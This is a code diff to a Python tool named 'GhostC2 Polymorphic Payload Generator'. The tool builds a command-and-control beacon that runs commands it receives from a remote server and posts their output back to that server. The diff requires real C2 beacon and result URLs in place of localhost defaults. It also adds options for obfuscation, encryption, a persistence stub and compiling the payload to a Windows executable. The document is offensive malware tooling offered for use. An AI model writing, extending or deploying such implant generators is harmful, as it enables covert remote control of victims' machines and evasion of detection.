@@ -65,7 +65,7 @@ def {beacon_func}():
                         except subprocess.CalledProcessError as e:
                             {result_var} = f"[!] Command failed: {{e.output.decode().strip()}}"
 
-                    print(f"[>] Sending result:\\n{{{result_var}}}")
+                    print("[>] Sending result:\\n{{}}".format({result_var}))
 
                     {result_obj} = {{
                         "hostname": {host_var},
@@ -113,11 +113,10 @@ def generate_variable_names():
 def generate_payload(c2_url, result_url, output_path):
     var_names = generate_variable_names()
 
-    # Dynamically resolve full absolute path to `server/utils`
     script_dir = os.path.dirname(os.path.abspath(__file__))
-    repo_root = os.path.abspath(os.path.join(script_dir, ".."))  # One level up
+    repo_root = os.path.abspath(os.path.join(script_dir, ".."))
     abs_utils_path = os.path.join(repo_root, "utils")
-    abs_utils_path = abs_utils_path.replace("\\", "\\\\")  # Windows escaping
+    abs_utils_path = abs_utils_path.replace("\\", "\\\\")
 
     filled_code = PAYLOAD_TEMPLATE.format(
         c2_url=c2_url,
@@ -148,15 +147,26 @@ def compile_to_exe(source_path):
 # === Entrypoint ===
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="GhostC2 Polymorphic Payload Generator")
-    parser.add_argument("--c2", default="http://localhost:8080/beacon", help="C2 beacon URL")
-    parser.add_argument("--result", default="http://localhost:8080/result", help="C2 result post URL")
+    parser.add_argument("--c2", required=True, help="C2 beacon URL")
+    parser.add_argument("--result", required=True, help="C2 result post URL")
     parser.add_argument("--exe", action="store_true", help="Compile payload to .exe using PyInstaller")
+    parser.add_argument("--bat", action="store_true", help="Placeholder for batch output (not implemented)")
+    parser.add_argument("--py", action="store_true", help="Export raw .py file only")
+    parser.add_argument("--ps1", action="store_true", help="Placeholder for PowerShell output (not implemented)")
+    parser.add_argument("--obfuscate", action="store_true", help="Apply string or function obfuscation")
+    parser.add_argument("--encrypt", action="store_true", help="Apply additional encryption layer")
+    parser.add_argument("--persist", action="store_true", help="Add persistence stub")
+    parser.add_argument("--output", help="Custom output filename for payload")
     args = parser.parse_args()
 
     os.makedirs("builds", exist_ok=True)
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"ghost_payload_{timestamp}.py"
-    output_path = os.path.join("builds", filename)
+
+    if args.output:
+        output_path = args.output
+    else:
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"ghost_payload_{timestamp}.py"
+        output_path = os.path.join("builds", filename)
 
     generate_payload(args.c2, args.result, output_path)
 
